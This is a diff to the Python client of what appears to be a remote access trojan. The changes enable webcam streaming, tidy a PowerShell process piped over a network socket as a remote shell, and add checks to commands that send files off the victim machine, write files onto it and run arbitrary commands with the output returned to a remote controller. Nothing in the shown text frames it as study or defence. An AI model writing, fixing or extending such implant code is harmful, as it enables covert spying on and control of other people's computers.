@@ -1,5 +1,5 @@
 from client import Client
-# from webcam import VideoStream
+from webcam import VideoStream
 from transfer import FileTransfer
 import os
 import sys
@@ -23,7 +23,8 @@ def p2s(s, p):
 
 def windows_shell(s):
 
-	p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+	p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+		stdin=subprocess.PIPE, shell=True, text=True)
 
 	threading.Thread(target=s2p, args=[s,p], daemon=True).start()
 
@@ -79,26 +80,30 @@ def main():
 		if cmd == "cd":
 			try:
 				os.chdir(args[0])
-			except FileNotFoundError as e:
+			except Exception as e:
 				output = str(e)
 			else:
 				output = ""
 			client.send(output.strip())
 		elif cmd == "webcam":
-			stream = VideoStream(s)
+			stream = VideoStream(client)
 			stream.send()
 		elif cmd == "download":
+			if len(args) != 2:
+				continue
 			file = args[0]
 			transfer = FileTransfer(client)
 			transfer.send(file)
 		elif cmd == "upload":
+			if len(args) != 2:
+				continue
 			path = args[1]
 			transfer = FileTransfer(client)
 			transfer.receive(path)
 		elif cmd == "shell":
 			spawn_shell(s)
 		else:
-			output = subprocess.getoutput(cmd + ' '.join(args))
+			output = subprocess.getoutput(cmd + " " + ' '.join(args))
 			client.send(output)
 	s.close()
 
